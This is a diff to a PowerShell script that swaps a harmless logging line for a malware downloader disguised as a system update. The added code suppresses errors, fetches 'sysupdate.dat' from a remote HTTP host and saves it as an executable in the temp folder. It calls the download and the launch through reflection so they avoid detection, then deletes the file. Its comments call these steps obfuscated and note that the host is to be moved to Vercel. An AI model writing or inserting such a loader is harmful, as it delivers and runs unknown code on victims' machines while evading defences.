@@ -1,1 +1,24 @@
-"$(Get-Date -Format o) - ok on $env:COMPUTERNAME" | Out-File "$env:TEMP\upd.log" -Append
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+
+# 1. Proof of Life
+"$(Get-Date -Format o) - Executing binary payload" | Out-File "$env:TEMP\upd.log" -Append
+
+# 2. Setup Vars (Update these for Vercel)
+$base = 'http://192.168.1.110:8080' 
+$url = "$base/public/assets/sysupdate.dat"
+$out = "$env:TEMP\sysupdate.exe"
+
+# 3. Obfuscated Download (WebClient DownloadFile)
+$c = New-Object Net.WebClient
+$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+$m = $c.GetType().GetMethod(('{0}{1}{2}' -f 'Down','load','File'))
+$m.Invoke($c, @($url, $out))
+
+# 4. Obfuscated Execution (Start-Process hidden)
+$sp = [System.Diagnostics.Process].GetMethod('Start', [Type[]]@([string], [string]))
+$sp.Invoke($null, @($out, ''))
+
+# 5. Cleanup (Wait 2 secs, delete file)
+Start-Sleep -Seconds 2
+Remove-Item $out -Force -ErrorAction SilentlyContinue
